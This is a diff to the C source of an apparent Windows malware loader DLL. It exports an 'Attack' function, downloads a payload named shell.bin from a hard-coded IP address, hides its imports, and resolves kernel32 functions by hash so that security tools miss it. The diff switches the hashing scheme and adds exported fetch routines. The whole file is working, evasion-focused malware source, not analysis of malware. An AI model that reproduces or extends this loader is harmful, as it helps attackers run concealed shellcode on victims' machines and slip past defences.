@@ -2,8 +2,8 @@
 #include "common.h"
 
 unsigned char* pPayload = NULL;
-PSTR url = "192.168.231.133";
-PSTR endpoint = "shell.bin";
+PSTR url = "192.168.139.132";
+PSTR endpoint = "/shell.bin";
 SIZE_T sSize = -1;
 
 extern __declspec(dllexport) int Attack()
@@ -16,8 +16,8 @@ extern __declspec(dllexport) int Attack()
 
     IatCamouflage();
 
-    fnAddVectoredExceptionHandler        pAddVectoredExceptionHandler     = (fnAddVectoredExceptionHandler)GetProcAddressH(GetModuleHandleH(kernel32dll_CRC32), AddVectoredExceptionHandler_CRC32);
-    fnRemoveVectoredExceptionHandler     pRemoveVectoredExceptionHandler  = (fnRemoveVectoredExceptionHandler)GetProcAddressH(GetModuleHandleH(kernel32dll_CRC32), RemoveVectoredExceptionHandler_CRC32);
+    fnAddVectoredExceptionHandler        pAddVectoredExceptionHandler     = (fnAddVectoredExceptionHandler)GetProcAddressH(GetModuleHandleH(kernel32dll_JOAA), AddVectoredExceptionHandler_JOAA);
+    fnRemoveVectoredExceptionHandler     pRemoveVectoredExceptionHandler  = (fnRemoveVectoredExceptionHandler)GetProcAddressH(GetModuleHandleH(kernel32dll_JOAA), RemoveVectoredExceptionHandler_JOAA);
 
     if (!pAddVectoredExceptionHandler || !pRemoveVectoredExceptionHandler)
     {
@@ -41,19 +41,32 @@ extern __declspec(dllexport) int Attack()
     return 0;
 }
 
+extern __declspec(dllexport) int fetch()
+{
+    Download(&pPayload, url, endpoint, FALSE);
+}
+
+DWORD WINAPI fetch_payload(LPVOID lpParam)
+{
+    sSize = Download(&pPayload, url, endpoint, FALSE);
+    return sSize;
+}
 
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved)
 {
     switch (dwReason)
     {
         case DLL_PROCESS_ATTACH: {
-            sSize = Download(&pPayload, url, endpoint, FALSE);
+            //sSize = Download(&pPayload, url, endpoint, FALSE);
+            //__debugbreak();
+           /* WaitForSingleObject(CreateThread(NULL, 0, fetch_payload, NULL,0,NULL ), INFINITE);
+
             if (sSize == -1)
             {
                 printf("[!] Failed to fetch payload from server!\n");
                 return FALSE;
             }
-            break;
+            break;*/
         }
         case DLL_THREAD_ATTACH:
         case DLL_THREAD_DETACH:
